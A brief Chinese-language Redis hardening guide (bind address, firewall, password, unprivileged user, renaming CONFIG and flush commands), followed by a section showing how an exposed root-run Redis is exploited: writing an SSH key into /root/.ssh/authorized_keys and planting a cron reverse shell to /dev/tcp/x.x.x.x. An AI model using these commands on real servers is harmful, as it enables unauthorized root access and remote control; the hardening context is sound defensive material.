### Redis服务安全加固

1）指定网卡（127.0.0.1）

`bind 127.0.0.1`

2）设置防火墙策略

`iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT`

3）设置访问密码

`requirepass xxxxx`

4）服务运行权限最小化

`useradd -M -s /sbin/nologin [username]`
`sudo -u [username] /usr/bin/redis-server ./redis.conf`

5）隐藏重要命令

```shell
# config/flushdb/flushall 设置为空，即禁用该命令；或改为其它命令
    rename-command CONFIG ""
    rename-command flushall ""
    rename-command flushdb ""
    rename-command shutdown shotdown_test
```

6）安全补丁

定期关注最新软件版本，并及时升级 Redis 到最新版，防止新漏洞被恶意利用。

### 漏洞：获取root账号权限

前提：Redis以root身份运行，可连上redis

```shell
# redis-cli -h x.x.x.x
## 方式1.直接写入authorized_keys
config set dir /root/.ssh
config set dbfilename authorized_keys
set xxx "\n\n\nPublicKey\n\n\n"
save

## 方式2.反弹shell
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/Port 0>&1\n\n"
config set dir /var/spool/cron
config set dbfilename root
save

```

